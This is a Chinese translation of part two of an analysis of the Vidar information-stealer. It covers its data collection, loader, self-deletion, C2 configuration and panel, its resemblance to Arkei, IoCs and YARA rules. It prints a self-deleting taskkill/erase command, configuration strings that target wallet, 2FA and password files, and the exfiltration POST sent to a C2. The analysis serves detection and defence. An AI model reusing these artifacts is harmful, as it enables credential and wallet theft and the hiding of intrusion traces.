> 原文链接: https://www.anquanke.com//post/id/170193 


# Vidar窃密木马分析（下）


                                阅读量   
                                **336231**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者fumik0，文章来源：fumik0.com
                                <br>原文地址：[https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/](https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01155554bb6172bce2.jpg)](https://p4.ssl.qhimg.com/t01155554bb6172bce2.jpg)

接着上文，继续对Vidar窃密木马进行介绍。



## 硬件

通过注册表项的值来获取硬件名称：

```
HKEY_LOCAL_MACHINE  HARDWARE  DESCRIPTION  SYSTEM  CentralProcessor  ProcessorNameString
```

[![](https://p4.ssl.qhimg.com/t01a8a270d12f46251a.png)](https://p4.ssl.qhimg.com/t01a8a270d12f46251a.png)



## 网络

网络部分的实现很简单，通过将从**ip-api.com/line/**获取的数据进行转换，然后放入相应的日志中即可。

[![](https://p0.ssl.qhimg.com/t01a49b7eb5e1eb9f0d.png)](https://p0.ssl.qhimg.com/t01a49b7eb5e1eb9f0d.png)



## 进程

当Vidar运行后，将结合多个函数，来对正在运行的进程进行快照。

[![](https://p5.ssl.qhimg.com/t01c7b14126ddae8bb8.png)](https://p5.ssl.qhimg.com/t01c7b14126ddae8bb8.png)

当然，实现的步骤不难理解：
<li>先调用[CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)来获取所有已执行进程的完整快照，再使用[Process32First](https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-process32first)在循环中读取每个进程。<br>[![](https://p2.ssl.qhimg.com/t01b3ecb159123f5043.png)](https://p2.ssl.qhimg.com/t01b3ecb159123f5043.png)
</li>
然后检查该进程是父进程还是子进程，并获取**PROCESSENTRY32** 对象的以下2个值：
- th32ProcessID: PID
<li>szExeFile: The name of the PE<br>[![](https://p3.ssl.qhimg.com/t01ff2e6e88bc6028a6.png)](https://p3.ssl.qhimg.com/t01ff2e6e88bc6028a6.png)
</li>


## 软件

通过注册表项的值来获取系统已安装的软件：

```
HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionUninstall
```

它将对系统软件的以下2个值进行检索：
- DisplayName
<li>DisplayVersion<br>[![](https://p4.ssl.qhimg.com/t015493b707ab171022.png)](https://p4.ssl.qhimg.com/t015493b707ab171022.png)
</li>


## 结果

如果你想看最终执行结果，可以参考下面在[沙箱中运行](https://app.any.run/tasks/b439a1fd-fb62-4451-b9d4-d4a4597e3dfd)后生成的 information.txt（此处为Vidar 4.2版本）

```
Vidar Version: 4.2

Date: Thu Dec 13 14:39:05 2018
MachineID: 90059c37-1320-41a4-b58d-2b75a9850d2f
GUID: `{`e29ac6c0-7037-11de-816d-806e6f6e6963`}`

Path: C:UsersadminAppDataLocalTemptoto.exe 
Work Dir: C:ProgramDataLDGQ3MM434V3HGAR2ZUK

Windows: Windows 7 Professional [x86]
Computer Name: USER-PC
User Name: admin
Display Resolution: 1280x720
Display Language: en-US
Keyboard Languages: English (United States)
Local Time: 13/12/2018 14:39:5
TimeZone: UTC-0

[Hardware]
Processor: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz
CPU Count: 4
RAM: 3583 MB
VideoCard: Standard VGA Graphics Adapter

[Network]
IP: 185.230.125.140
Country: Switzerland (CH)
City: Zurich (Zurich)
ZIP: 8010
Coordinates: 47.3769,8.54169
ISP: M247 Ltd (M247 Ltd)

[Processes]
- System [4]
---------- smss.exe [264]
- csrss.exe [344]
&lt; ... &gt;

[Software]
Adobe Flash Player 26 ActiveX [26.0.0.131]
Adobe Flash Player 26 NPAPI [26.0.0.131]
Adobe Flash Player 26 PPAPI [26.0.0.131]
&lt; ... &gt;
```



## Loader模块

这个模块在代码实现上比较简单，但完成功能绰绰有余。
- 1.为即将下载的payload生成随机名称
- 2.下载payload
<li>3.执行payload<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01373a5168426499b2.png)
</li>
当从C2下载完二进制文件时，将使用具有特定参数的[CreateFileA](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-createfilea)函数：
<li>
**edi：**从C2下载的数据</li>
<li>
**80h：**文件没有设置其他属性（此属性仅在单独使用时才有效）</li>
<li>
**2：**若文件名已存在，此选项将强制覆盖</li>
<li>
**edi：**???</li>
<li>
**1*：**在接下里的操作中，访问设备或文件，需要读权限。除此之外，进程无法访问需要读权限的文件或设备</li>
<li>
**40000000h：**写入权限（GENERIC_WRITE）</li>
<li>
**ebp + lpFileName：**生成的文件名</li>
完成后，只需要将内容写入文件(WriteFile)，然后关闭相应句柄 (CloseHandle)即可。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01267e70cfaa7099b1.png)

到目前为止，文件已经被下载并保存在硬盘中，只需要用ShellExecuteA进行启动。所以不要犹豫，就在此时对API函数下断点来捕捉payload，不然错过最佳时机。



## Killing 模块

当窃密软件完成所有任务和清理工作后，会进行自我清除。首先它会调用[GetCurrentProcessId](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid)来查询自己的[PID](https://en.wikipedia.org/wiki/Process_identifier)。

[![](https://p5.ssl.qhimg.com/t013caca4e0867bb209.png)](https://p5.ssl.qhimg.com/t013caca4e0867bb209.png)

然后进入“func_GetProcessIdName”，尝试用[OpenProcess](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)打开自己的进程句柄，如果失败，将继续检索。这里最重要的环节是调用[GetModuleBaseNameA](https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-getmodulebasenamea)，它可以通过之前获取的PID来检索出其对应进程的进程名。

[![](https://p5.ssl.qhimg.com/t01afa865a42d3c7e91.png)](https://p5.ssl.qhimg.com/t01afa865a42d3c7e91.png)

在.rdata中将一些字符串进行硬编码，以备将来调用。

[![](https://p3.ssl.qhimg.com/t0159f6cf8ae3dfb023.png)](https://p3.ssl.qhimg.com/t0159f6cf8ae3dfb023.png)

当精心构造的请求完成后，Vidar 将使用[ShellExecuteA](https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea)调用shell命令行并执行指定的任务。这使它拥有清除payload和失陷主机交互痕迹的能力。

[![](https://p1.ssl.qhimg.com/t01775f109700fce79b.png)](https://p1.ssl.qhimg.com/t01775f109700fce79b.png)

回顾一下执行的命令：

```
C:WindowsSystem32cmd.exe” /c taskkill /im vidar.exe /f &amp; erase C:UsersPouetAppDataLocalTempvidar.exe &amp; exit
```

对应解释说明：

```
Offset File + db ‘/c taskkill /im’ + [GetModuleBaseNameA] + db ‘ /f &amp; erase’  + [GetModuleFileNameExA + GetModuleBaseNameA]+  + db ‘ &amp; exit’
```



## 信息存档

### <a class="reference-link" name="%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6%E5%A4%B9"></a>生成文件夹

文件夹命名格式为：<br>
COUNTRY + “_” + Machine GUID + “.zip”<br>
例如：<br>
NG_d6836847-acf3-4cee-945d-10c9982b53d1.zip

### <a class="reference-link" name="%E6%9C%80%E7%BB%88%E7%9A%84POST%E8%AF%B7%E6%B1%82"></a>最终的POST请求

在生成POST请求的过程中，最终生成的POST请求将进行修改，添加额外的标识以便C2服务器进行识别处理。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0190ad95bf52d45bfe.png)

不同的name字符串将保存在不同的数据库中，所以在HTTP请求中将出现不同的Content-Disposition。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01133e2ec4d124059e.png)

此外，我在这里发现了一个它使用的小技巧，就是在POST请求的响应中包含loader的配置信息。
- 如果没有包含信息，则响应”OK”
<li>如果包含了信息，则将特定的url存储在其中。<br>[![](https://p1.ssl.qhimg.com/t013cd28cbebaa47aa5.png)](https://p1.ssl.qhimg.com/t013cd28cbebaa47aa5.png)
</li>
这与config及network information模块采用了相同的技术。

沙盒示例：
<li>POST请求<br>[![](https://p1.ssl.qhimg.com/t0188c014a36786e8cd.png)](https://p1.ssl.qhimg.com/t0188c014a36786e8cd.png)
</li>
<li>对于POST请求的响应<br>[![](https://p5.ssl.qhimg.com/t01afbc7e9e5b056924.png)](https://p5.ssl.qhimg.com/t01afbc7e9e5b056924.png)
</li>


## 服务端

因为很容易就可以找到与这款窃密软件的相关信息，所以不需要费力去寻找在哪里才能买到它。为了吸引更多的用户，网上有许多教学视频，让我们通过视频教程来对它深入了解（所以截图均出自视频）。需要说明的是，以下界面为11月时的操作界面，现在可能发生了变化。

### <a class="reference-link" name="%E7%99%BB%E5%BD%95"></a>登录

[![](https://p3.ssl.qhimg.com/t017f712c25bb03f945.png)](https://p3.ssl.qhimg.com/t017f712c25bb03f945.png)

#### <a class="reference-link" name="Dashboard"></a>Dashboard

主面板具有很好的用户友好性。用户可以快速浏览自己账户内的各项基本信息。
- builder版本
- 何时可以生成payload
- 受害者数
<li>账号到期时间<br>[![](https://p0.ssl.qhimg.com/t01bcc26d7a38d2ccbb.png)](https://p0.ssl.qhimg.com/t01bcc26d7a38d2ccbb.png)
</li>
### <a class="reference-link" name="%E6%97%A5%E5%BF%97"></a>日志

对于日志部分，需要提一下的是系统允许用户为日志添加相应的注释。

[![](https://p1.ssl.qhimg.com/t0188f6a3a417867838.png)](https://p1.ssl.qhimg.com/t0188f6a3a417867838.png)

### <a class="reference-link" name="%E5%AF%86%E7%A0%81"></a>密码

[![](https://p5.ssl.qhimg.com/t01e2910098231dc864.png)](https://p5.ssl.qhimg.com/t01e2910098231dc864.png)

### <a class="reference-link" name="Builder"></a>Builder

Builder界面也很有趣，可以在这里看到使用者的操作日志。此外， 在下载部分生成的恶意软件和Arkei一样，并不会打包。

因此用户者必须使用加密/打包软件来对payload进行处理。

[![](https://p5.ssl.qhimg.com/t0114186a8abc82f0e7.png)](https://p5.ssl.qhimg.com/t0114186a8abc82f0e7.png)

### <a class="reference-link" name="%E8%AE%BE%E7%BD%AE"></a>设置

显而易见，这是最重要的界面，因为在这里可以生成payload。可以通过设置，启用（或不启用）某些功能来达到对目标机器进行针对性攻击。

因此，通过配置，Vidar可以同时执行多项功能。这意味着当payload感染受害者主机后，根据配置，窃取到的各项信息将保存在对应的文件夹中。获取到窃取的文件后，攻击者通过排序，可以很轻松的查看各项信息。

[![](https://p3.ssl.qhimg.com/t01e2c57c36a1042cfb.png)](https://p3.ssl.qhimg.com/t01e2c57c36a1042cfb.png)

当编辑或创建新规则时，将弹出此界面来实现之前提到的功能。恶意软件将到所有可能存在的路径下去检索指定的文件。

[![](https://p0.ssl.qhimg.com/t016833361058e59505.png)](https://p0.ssl.qhimg.com/t016833361058e59505.png)

经分析，我们发现在C2上，有许多配置项。以下是我们能找到的：

默认空配置：

```
1,1,1,1,1,1,1,1,0,1,250,none;
```

默认初始配置：

```
1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
```

用户配置示例：

```
1,1,1,1,1,1,1,1,1,1,250,grabba;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;100;true;movies:music:mp3;
1,1,0,1,1,1,1,1,1,1,250,инфа;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
1,1,1,1,1,1,1,1,1,1,250,Первое;%DESKTOP%;*.txt:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*;50;true;movies:music:mp3;
1,1,1,1,1,1,1,1,1,1,250,123435566;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
```

同时执行多项配置：

```
1,1,1,1,1,1,0,1,1,1,250,
DESKTOP;%DESKTOP%;*.txt:*.dat:*wallet*.*:*2fa*.*:*2fa*.png:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;
DOCUMENTS;%DOCUMENTS%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;
DRIVE_REMOVABLE;%DRIVE_REMOVABLE%;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;
```

如上文中所示，通过特定的格式，将其分为三个部分，三项配置分别为：
- DESKTOP
- DOCUMENTS
- DRIVE_REMOVABLE
它们将各自存储在对应的文件夹中。

所有配置信息都可以在我的[github](https://github.com/Fmk0/work/tree/master/Vidar)仓库中找到。

通过对配置面板的介绍，可以看出窃密软件无论是在loader模块，还是投递手段等方面，都变的越来越类似。

正如一开始提到的，用户只能通过该界面对恶意软件进行配置，具体的管理由维护团队来负责。为了防止代理被过滤，控制域名将定期进行更换。（这一点在样本中也很容易看出来，因为不同的版本将对应不同的域名）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ea9291c8fd41b311.png)

如官方声明所说，在用户界面，还存在2FA认证。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a1ae421ae58e5d2b.png)



## 一些有趣的信息

在登录界面搜索信息时，将看到一些有趣的信息。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01484543dc9c15d306.png)

让我们看看背后隐藏着什么？

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01739801a05eca99be.png)

原来是一个彩蛋，来告诉大家Vidar(维达)是北欧神话中的复仇之神。



## Vidar—山寨版Arkei？

如果关注相关request（请求）和代码，会发现Vidar几乎与Arkei相同。虽然在某些方面略有不同，但所有功能都是相同的。如果蓝队成员只是根据沙箱运行结果进行判断，就会被迷惑。因为目前的Yara规则会将触发条件的Vidar当做Arkei，这会导致错误的检测结果。因此对代码进行分析是非常有必要的，这样才能弄清楚它是如何运行的。

他们（Vidar&amp;Arkei）的主要功能非常相似：

[![](https://p0.ssl.qhimg.com/t01d32c83a998bd4e30.png)](https://p0.ssl.qhimg.com/t01d32c83a998bd4e30.png)

保存窃取到信息的方法也一样。所以很难通过这些方面对二者进行区分。

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E5%B7%AE%E5%BC%82"></a>代码差异

一个简单的判断方法就是看有没有“Vidar.cpp”这个字符串。

[![](https://p5.ssl.qhimg.com/t0109a6236fde0a4b56.png)](https://p5.ssl.qhimg.com/t0109a6236fde0a4b56.png)

**Vidar的签名**

[![](https://p3.ssl.qhimg.com/t011e369f725f1957bf.png)](https://p3.ssl.qhimg.com/t011e369f725f1957bf.png)

**Arkei的签名**

[![](https://p4.ssl.qhimg.com/t010bfd282d7b254d53.png)](https://p4.ssl.qhimg.com/t010bfd282d7b254d53.png)

### <a class="reference-link" name="%E9%80%9A%E4%BF%A1%E5%B7%AE%E5%BC%82"></a>通信差异

分析人员可能会误认为Vidar与Arkei构造的HTTP 请求是不同的，然而事实并非如此。

**Vidar HTTP 请求**

```
/ (i.e 162)    &lt;- 配置信息
ip-api.com/line/    &lt;- 获取网络配置信息
/msvcp140.dll       &lt;- 获取DLL文件
/nss3.dll           &lt;- 获取DLL文件
/softokn3.dll       &lt;- 获取DLL文件
/vcruntime140.dll   &lt;- 获取DLL文件
/                   &lt;- 向C2上传受害者信息
```

一个小的区别是Arkei不会下载二进制文件，而Vidar则会下载执行一些窃密模块时所需的相关二进制文件。

**Arkei HTTP请求**

```
/index.php        &lt;- 配置信息
ip-api.com/line/  &lt;- 获取网络配置信息
/index.php        &lt;- 向C2上传受害者信息
```

**配置参数**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0158f28b3eebbd6ece.png)

如果你想弄清楚Arkei中各配置参数的含义，可以参考下表：

[![](https://p1.ssl.qhimg.com/t0179079cc93bf70d05.png)](https://p1.ssl.qhimg.com/t0179079cc93bf70d05.png)

可以看到，POST发生了轻微的变化，Vidar添加了配置文件名、版本等新字段。

我们可以通过PCAP数据流来更清楚的看出request中的异同，可以看到除了除了版本信息和配置信息，其他部分都是相同的（不同之处用星号标记)。如果我们分析更老的版本，将发现除了请求的路径之外，没有其他区别

**最后的POST请求—Vidar**

```
POST / HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 66809
Host: some.lovely.vidar.c2.with.love
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="hwid"

90059c37-1320-41a4-b58d-2b75a9850d2f
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="os"

Windows 7 Professional
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="platform"

x86
**--1BEF0A57BE110FD467A**
**Content-Disposition: form-data; name="profile"**

**XXX &lt;- Random Int**
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="user"

admin
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="cccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="fcount"

0
**--1BEF0A57BE110FD467A**
**Content-Disposition: form-data; name="telegram"**

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ver"

**4.1**
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="logs"; filename="COUNTRY_.zip"
Content-Type: zip

```

### <a class="reference-link" name="%E5%8A%9F%E8%83%BD%E5%B7%AE%E5%BC%82"></a>功能差异

通过对不同功能的分析， 我发现在Vidar中一些功能并没有实现。比如Steam信息窃取和Skype信息窃取，在Arkei中是有这些功能的，而在Vidar中，并没有实现。但相反的，对于2FA 信息的窃取，只有Vidar能做到。（至少根据我获取到的样本是这样）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016c46915d59c6a7a8.png)



## Arkei是否仍活跃？

在一个售卖此窃密软件的页面可以看到，该软件仍在被出售并保持更新。可以看到不久的将来将发布v10版本，所以让我们拭目以待，看看它有哪些变化。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0112e9db7f2c9feacc.png)



## 破解版Vidar

此外，一些人在推特上发现了经破解的版本。在操作页面源码中，这款基于Vidar 2.3版本构建的软件被称之为Vidar 或 “Anti-Vidar”。

**登录**

它的登录界面和Android Lokibot一样（感谢<a>@siri_urz</a>）。在这种情况中，代码永远不会说谎，它会帮助我们识别真正的C2/恶意软件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0196f4d28baa8c7694.png)

**配置代码**

与现在的操作面板及样本相比，破解版的配置要简单的很多。默认配置硬编码在PHP文件中，当value为11时就可以获取配置信息。



## IoCs

**SHA256哈希**

```
3A20466CC8C07638B8882CCC9B14C08F605F700F03D388CF85B2E76C51D64D65 0E982A02D754588D4EE99F30084B886B665FF04A1460D45C4FD410B04B10A8AF 2679FA8E9FD0C1F6F26527D53759BB596FDA43A741B4DFCC99A8C0907836A835 9EC586B07961E0C93C830DD1C47598FE21277432F11809A4B73DF7370CDD2E29 42C6950CA57D8805C217E3334158DAB4CC71A50C94D77F608B1C442BFD2B01CA D71F81EDF8AC04639D3B7C80AA178DF95C2CBFE73F81E931448A475FB771267A DAD5FCEAB002791DD6FD575782C173F1A39E0E7CE36E6DE1BAEFA95D0A8FB889 66162E69CA30A75E0DD1A6FBB9028FCFBE67B4ADE8E844E7C9FF2DCB46D993D8 EFF272B93FAA1C8C403EA579574F8675AB127C63ED21DB3900F8AB4FE4EC6DA9 EDBAC320C42DE77C184D30A69E119D27AE3CA7D368F802D2F8F1DA3B8D01D6DD B1D5B79D13F95A516ABBCC486841C8659984E5135F1D9C74343DCCD4390C3475 543AEE5A5435C77A8DE01433079F6381ADB4110F5EF4350E9A1A56B98FE40292 65B2BD17E452409397E2BD6F8E95FE8B708347D80074861698E4683BD12437A9 47E89F2C76D018D4952D421C5F1D603716B10E1712266DA32F63082F042F9C46 5D37323DA22C5414F6E03E06EFD184D7837D598C5E395E83C1BF248A7DE57155 5C0AF9C605AFD72BEF7CE8184BCCC9578EDB3A17498ACEBB74D02EB4AF0A6D2E 65287763245FDD8B56BB72298C78FEA62405BD35794A06AFBBE23CC5D38BE90A 20E92C2BF75C473B745617932F8DC0F8051BFC2F91BB938B2CC1CD808EBBC675 C752B68F3694B2FAAB117BCBA36C156514047B75151BBBFE62764C85CEF8ADE5 AE2EBF5B5813F92B0F7D6FCBADFA6E340646E4A776163AE86905E735A4B895A0 8F73E9C44C86D2BBADC545CED244F38472C5AACE0F75F57C8FC2398CE0A7F5A1
```

感谢<a>@benkow</a>_帮忙找到的一些样本

**domains**

```
malansio.com
nasalietco.com
binacoirel.com
newagenias.com
bokolavrstos.com
naicrose.com
benderio.com
cool3dmods.com
```

### <a class="reference-link" name="MITRE%20ATT&amp;CK"></a>MITRE ATT&amp;CK
- [发现 – 系统信息发现](https://attack.mitre.org/techniques/T1082)
- [发现 – 系统时间发现](https://attack.mitre.org/techniques/T1124)
- [发现 – 查询注册表](https://attack.mitre.org/techniques/T1012)
- [发现 – 进程检索](https://attack.mitre.org/techniques/T1057/)
- [执行 – 命令行界面](https://attack.mitre.org/techniques/T1059)
- [执行 – 通过模块加载执行](https://attack.mitre.org/techniques/T1129)
- [凭据访问 – 文件中的凭据](https://attack.mitre.org/techniques/T1081)
- [收藏 – 屏幕捕获](https://attack.mitre.org/techniques/T1113)
- [收集 – 来自可移动媒体的数据](https://attack.mitre.org/techniques/T1025)
- [收集 – 来自本地系统的数据](https://attack.mitre.org/techniques/T1005/)
- [窃密 – 数据压缩](https://attack.mitre.org/techniques/T1002)
### <a class="reference-link" name="Yara%E8%A7%84%E5%88%99"></a>Yara规则

**Vidar**

```
rule Vidar_Stealer : Vidar 
`{`
    meta:
        description = "Yara rule for detecting Vidar stealer"
        author = "Fumik0_"

    strings:
        $mz = `{` 4D 5A `}`

        $s1 = `{` 56 69 64 61 72 `}`
        $s2 = `{` 31 42 45 46 30 41 35 37 42 45 31 31 30 46 44 34 36 37 41 `}`
    condition:
        $mz at 0 and ( (all of ($s*)) )
`}`

rule Vidar_Early : Vidar 
`{`
    meta:
        description = "Yara rule for detecting Vidar stealer - Early versions"
        author = "Fumik0_"

    strings:
        $mz = `{` 4D 5A `}`
        $s1 =  `{` 56 69 64 61 72 `}`
        $hx1 = `{` 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 `}`
    condition:
         $mz at 0 and all of ($hx*) and not $s1
`}`

